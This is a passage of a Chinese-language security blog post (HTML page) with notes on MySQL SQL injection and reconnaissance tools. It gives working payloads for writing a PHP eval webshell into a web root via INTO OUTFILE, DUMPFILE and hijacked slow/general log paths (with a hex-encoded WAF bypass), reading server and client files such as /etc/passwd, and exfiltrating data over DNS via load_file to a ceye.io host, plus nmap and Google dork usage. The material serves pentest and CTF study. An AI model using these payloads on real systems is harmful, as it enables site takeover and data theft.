+<td>[5.7.8, 5.7.11]</td>
+<td></td>
+<td></td>
+<td>✔️</td>
+<td></td>
+<td>200</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>UUID</td>
+<td>uuid_to_bin bin_to_uuid</td>
+<td>[8.0, ?)</td>
+<td></td>
+<td></td>
+<td></td>
+<td>✔️</td>
+<td>128</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>XPath</td>
+<td>extractvalue updatexml</td>
+<td>[5.1.5, ?)</td>
+<td>✔️</td>
+<td>✔️</td>
+<td>✔️</td>
+<td>✔️</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<h4 id="读服务器文件"><a href="#读服务器文件" class="headerlink" title="读服务器文件"></a>读服务器文件</h4><p>mysql提供了用于读取文件的函数（<strong>以下两种方法均受到secure-file-priv的限制</strong>）：</p>
+<p>select load_file(file_path);        #读文件，回显</p>
+<p>load data infile file_path into table test FIELDS TERMINATED BY ‘\n’; #按照\n(换行)分割读取指定的file_path服务端文件的数据并插入到test表中。</p>
+<h4 id="伪造mysql服务端读客户端文件"><a href="#伪造mysql服务端读客户端文件" class="headerlink" title="伪造mysql服务端读客户端文件"></a>伪造mysql服务端读客户端文件</h4><p>load data infile file_path into table test FIELDS TERMINATED BY ‘\n’;是读取客户端文件并把数据插入到test表中，读取客户端文件的前提是local_infile这个变量是On，通过查阅官方文档可知在Mysql8之后local_infile这个变量默认为OFF，我自测Mysql5.6的环境local_infile默认是On。</p>
+<p>我在本机D盘准备了Program.txt，成功把数据写入了flag表。</p>
+<pre class="line-numbers language-mysql"><code class="language-mysql">load data local infile "D://Program.txt" into table flag FIELDS TERMINATED BY '\n'
+> Affected rows: 3
+> 时间: 0.034s
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>实际上读客户端指定路径的文件这个操作是服务端来指明的。假设客户端向伪造的mysql服务器发送一个查询的请求，服务端通过伪造请求就可以任意读取客户端的文件：</p>
+<ol>
+<li>客户端：我要flag表中的数据</li>
+<li>服务端：我要你的&#x2F;etc&#x2F;passwd内容</li>
+<li>客户端：给你&#x2F;etc&#x2F;passwd的内容</li>
+</ol>
+<p>由于需要伪造mysql服务器，个人认为利用面较小。该节内容摘自<a target="_blank" rel="noopener" href="https://paper.seebug.org/1112/#_3">LoRexxar@知道创宇404实验室 &amp; Dawu@知道创宇404实验室</a></p>
+<h4 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h4><p>常见的有outfile dumpfile函数写shell,假设网站目录路径为&#x2F;var&#x2F;www&#x2F;html。</p>
+<pre class="line-numbers language-mysql"><code class="language-mysql">union select 1,"<?php @eval($_POST[1]);?>",3 into outfile '/var/www/html/shell.php';
+union select 2,"<?php @eval($_POST[1]);?>",3 into dumpfile '/var/www/html/shell.php';
+
+--mysql识别16进制，因此也可以用0x绕过一些WAF。
+
+union select 1,0x223c3f70687020406576616c28245f504f53545b315d293b3f3e22,3 into outfile '/var/www/html/shell.php';
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>限制：</p>
+<ul>
+<li>secure_file_priv支持web目录文件导出</li>
+<li>数据库用户file权限</li>
+<li>绝对路径</li>
+</ul>
+<p>由于受到secure-file-priv限制，写shell往往难以实现。因此可以通过日志文件的方法来绕过。</p>
+<p>原理：mysql存在日志以及慢日志机制，它记录了用户的操作。由于general_log(日志开关)默认是关闭的，slow_query_log(慢日志开关)默认是开启的，因此在这里分析慢日志。</p>
+<p>查询：show GLOBAL VARIABLES like ‘%slow_query_log%’</p>
+<table>
+<thead>
+<tr>
+<th align="center">变量名</th>
+<th align="center">值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">slow_query_log_file</td>
+<td align="center">&#x2F;www&#x2F;server&#x2F;data&#x2F;mysql-slow.log</td>
+</tr>
+<tr>
+<td align="center">slow_query_log</td>
+<td align="center">ON</td>
+</tr>
+</tbody></table>
+<p>可以看到slow_query_log是默认开启滴，并且慢日志存储路径为&#x2F;www&#x2F;server&#x2F;data&#x2F;mysql-slow.log。</p>
+<p>顾名思义，只有执行时间慢的sql语句才被记录与慢日志中，可以通过query_time查看时间阈值，我这里默认是3秒，也就是说大于3秒执行时间的语句都会记录于慢日志中</p>
+<p>我在测试环境中执行：select ‘<?php phpinfo();?>‘ or sleep(10)。</p>
+<p>运行时间为10s&gt;&gt;3s，因此查看mysql-slow.log能看到这次记录。</p>
+<img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220708231845.png" style="zoom:50%;" />
+
+<p>那么这也就意味着如果我们通过set global slow_query_log_file&#x3D;’&#x2F;var&#x2F;www&#x2F;html&#x2F;log.php’设置慢日志为网站根目录下的php文件，就能写入webshell了。可以看到我只进行了select ‘<?php phpinfo();?>‘ or sleep(10)操作，并未写文件。log日志也是同理。</p>
+<p>因此payload：</p>
+<pre class="line-numbers language-mysql"><code class="language-mysql">#慢日志
+show global variables like '%slow_query_log%'    #查看路径，以及慢日志开关
+set global slow_query_log_file='/var/www/html/shell.php'   #设置路径
+set global slow_query_log=ON        #设置开关
+select @@long_query_time                 #非必须，最好还是先看看
+select '<?php eval($_POST[1]);?>' or sleep(10)       #写入webshell
+##访问shell.php  getshell
+
+#log日志
+show global variables like '%general_log%'   #查看路径，以及日志开关
+mysql> set global general_log_file = '/var/www/html/shell.php'    #设置路径
+mysql> set global general_log = on         #设置开关
+select '<?php eval($_POST[1]);?>'      #写入webshell
+##访问shell.php  getshell
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="DNSLOG外带"><a href="#DNSLOG外带" class="headerlink" title="DNSLOG外带"></a>DNSLOG外带</h4><p>无论是靶场还是真实场景经常会遇到sql注入无回显，因此需要盲注。如果目标服务器是windows，并且能出网，这时可以尝试DNSLOG外带数据。</p>
+<p><code>payload: load_file(concat(&#39;\\\\&#39;,(select user()),&#39;.????.ceye.io&#39;))</code></p>
+<h2 id="kali-linux探索之漏洞扫描"><a href="#kali-linux探索之漏洞扫描" class="headerlink" title="kali linux探索之漏洞扫描"></a>kali linux探索之漏洞扫描</h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><blockquote>
+<p>用于探测存活主机，扫描主机端口，探测主机操作系统</p>
+</blockquote>
+<p>nmap [扫描类型] [参数] 目标IP</p>
+<h4 id="扫描类型"><a href="#扫描类型" class="headerlink" title="扫描类型"></a>扫描类型</h4><ul>
+<li>-sT         TCP连接扫描，需要建立三次握手，因此会留下日志记录</li>
+<li>-sS         SYN扫描，不建立三次握手，很少会留下日志记录（默认是-sS)</li>
+<li>-P0         扫描之前不需要Ping，用于绕过防火前禁Ping功能</li>
+<li>-sV         探测服务版本信息（服务指纹）</li>
+<li>-sU         UDP扫描</li>
+</ul>
+<h4 id="扫描参数"><a href="#扫描参数" class="headerlink" title="扫描参数"></a>扫描参数</h4><ul>
+<li>-v   显示扫描过程</li>
+<li>-p   指定端口号，比如[1-100],[22,135,1433]</li>
+<li>-A   全面系统监测，扫描系统指纹</li>
+<li>-T4  针对TCP端口禁止动态扫描延迟超过10ms</li>
+<li>-iL    批量扫描，读取主机列表，如[-iL &#x2F;home&#x2F;ip.txt]</li>
+<li>-oG  将扫描结果输出到某个文件</li>
+<li>–script 指定脚本扫描</li>
+</ul>
+<p>一般Nmap与fping联动（fping先扫描存活主机）：</p>
+<ol>
+<li>fping -a -g 192.168.157.9 192.168.157.200 -q &gt; &#x2F;tmp&#x2F;alive.txt</li>
+<li>Nmap -iL &#x2F;tmp&#x2F;alive.txt</li>
+</ol>
+<h3 id="GOOGLE-HACK语法"><a href="#GOOGLE-HACK语法" class="headerlink" title="GOOGLE HACK语法"></a>GOOGLE HACK语法</h3><ul>
+<li>intitle：指定标题</li>
+<li>inurl：指定url</li>
+<li>intext：指定正文内容</li>
+<li>filetype：指定搜索的文档类型</li>
+<li>cache：搜索网页快照</li>
+<li>site：将搜索范围限制在某个网站或域名中</li>
+</ul>
+</article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="http://www.squirt1e.top">Squirt1e</a></p><p> <span>Link:  </span><a href="http://www.squirt1e.top/2023/05/15/sql-zhu-ru-zong-jie-mei-xie-wan/">http://www.squirt1e.top/2023/05/15/sql-zhu-ru-zong-jie-mei-xie-wan/</a></p><p> <span>Copyright:  </span><span>All articles in this blog are licensed under <a rel="license noopener" target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/3.0">CC BY-NC-SA 3.0</a> unless stating additionally.</span></p></div><div class="post-paginator"><a class="prevSlogan" href="/2023/06/13/fastjson-jie-he-er-ci-fan-xu-lie-hua-rao-guo-hei-ming-dan/" title="Fastjson结合二次反序列化绕过黑名单"><span>< PreviousPost</span><br><span class="prevTitle">Fastjson结合二次反序列化绕过黑名单</span></a><a class="nextSlogan" href="/2023/03/27/nkctf2023-web/" title="NKCTF2023 WEB"><span>NextPost ></span><br><span class="nextTitle">NKCTF2023 WEB</span></a><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span> | theme </span><a target="_blank" rel="noopener" href="https://github.com/Longlongyu/hexo-theme-Cxo"><span>Cxo</span></a></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5-amp-amp-%E5%B7%A5%E5%85%B7%E7%AC%94%E8%AE%B0"><span class="toc-number">1.</span> <span class="toc-text">SQL注入&amp;&amp;工具笔记</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%93%81%E4%B8%89%E7%AC%94%E8%AE%B0"><span class="toc-number">1.1.</span> <span class="toc-text">铁三笔记</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#mysql%E4%B8%AD%E4%B8%80%E4%BA%9B%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.0.1.</span> <span class="toc-text">mysql中一些常用函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MYSQL%E9%93%BE%E6%8E%A5%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.0.2.</span> <span class="toc-text">MYSQL链接字符串函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.0.3.</span> <span class="toc-text">报错注入函数</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Trick"><span class="toc-number">1.2.</span> <span class="toc-text">Trick</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#information-schema%E8%A2%AB%E7%A6%81%E7%94%A8"><span class="toc-number">1.2.0.1.</span> <span class="toc-text">information_schema被禁用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#InnoDb"><span class="toc-number">1.2.0.1.1.</span> <span class="toc-text">InnoDb</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#sys"><span class="toc-number">1.2.0.1.2.</span> <span class="toc-text">sys</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.0.1.3.</span> <span class="toc-text">无列名注入</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%84%E7%A7%8D%E5%85%B3%E9%94%AE%E5%AD%97%E3%80%81%E5%87%BD%E6%95%B0%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-number">1.2.0.2.</span> <span class="toc-text">各种关键字、函数过滤绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#and-or"><span class="toc-number">1.2.0.2.1.</span> <span class="toc-text">and or</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC"><span class="toc-number">1.2.0.2.2.</span> <span class="toc-text">空格</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8D%95-x2F-%E5%8F%8C%E5%BC%95%E5%8F%B7"><span class="toc-number">1.2.0.2.3.</span> <span class="toc-text">单&#x2F;双引号</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.0.2.4.</span> <span class="toc-text">函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8B%AC%E5%8F%B7"><span class="toc-number">1.2.0.2.5.</span> <span class="toc-text">括号</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%80%97%E5%8F%B7"><span class="toc-number">1.2.0.2.6.</span> <span class="toc-text">逗号</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#if"><span class="toc-number">1.2.0.2.7.</span> <span class="toc-text">if</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AF%94%E8%BE%83%E7%AC%A6%E5%8F%B7%EF%BC%88%E5%A4%A7%E4%BA%8E-gt-%E3%80%81%E5%B0%8F%E4%BA%8E-lt-%EF%BC%89"><span class="toc-number">1.2.0.2.8.</span> <span class="toc-text">比较符号（大于&gt;、小于&lt;）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%A8%E9%87%8A%E7%AC%A6"><span class="toc-number">1.2.0.2.9.</span> <span class="toc-text">注释符</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AD%89%E4%BA%8E%E5%8F%B7"><span class="toc-number">1.2.0.2.10.</span> <span class="toc-text">等于号</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#union%EF%BC%8Cselect%EF%BC%8Cwhere"><span class="toc-number">1.2.0.2.11.</span> <span class="toc-text">union，select，where</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#order-by%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.2.0.3.</span> <span class="toc-text">order by盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B1%80%E9%99%90%E7%9A%84%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.0.4.</span> <span class="toc-text">局限的报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#uuid"><span class="toc-number">1.2.0.4.1.</span> <span class="toc-text">uuid</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#exp"><span class="toc-number">1.2.0.4.2.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Bigint"><span class="toc-number">1.2.0.4.3.</span> <span class="toc-text">Bigint</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%80%9F%E6%9F%A5%E8%A1%A8"><span class="toc-number">1.2.0.4.4.</span> <span class="toc-text">速查表</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%BB%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%96%87%E4%BB%B6"><span class="toc-number">1.2.0.5.</span> <span class="toc-text">读服务器文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0mysql%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%BB%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%96%87%E4%BB%B6"><span class="toc-number">1.2.0.6.</span> <span class="toc-text">伪造mysql服务端读客户端文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%85%A5webshell"><span class="toc-number">1.2.0.7.</span> <span class="toc-text">写入webshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DNSLOG%E5%A4%96%E5%B8%A6"><span class="toc-number">1.2.0.8.</span> <span class="toc-text">DNSLOG外带</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#kali-linux%E6%8E%A2%E7%B4%A2%E4%B9%8B%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F"><span class="toc-number">1.3.</span> <span class="toc-text">kali linux探索之漏洞扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap"><span class="toc-number">1.3.1.</span> <span class="toc-text">Nmap</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">扫描类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E5%8F%82%E6%95%B0"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">扫描参数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GOOGLE-HACK%E8%AF%AD%E6%B3%95"><span class="toc-number">1.3.2.</span> <span class="toc-text">GOOGLE HACK语法</span></a></li></ol></li></ol></li></ol></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>
